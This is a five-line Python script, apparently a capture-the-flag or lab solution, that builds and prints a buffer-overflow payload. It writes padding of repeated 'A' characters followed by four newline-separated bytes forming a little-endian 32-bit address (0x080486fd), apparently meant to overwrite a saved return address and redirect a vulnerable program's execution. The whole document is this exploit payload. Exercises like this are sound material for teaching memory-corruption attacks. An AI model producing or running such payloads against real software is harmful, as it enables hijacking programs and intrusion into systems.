  1 import struct
  2 payload = 'A'*12
  3 payload += 'A\n'*24
  4 payload += '\xfd\n' + '\x86\n' + '\x04\n'+ '\x08\n'
  5 print(payload)
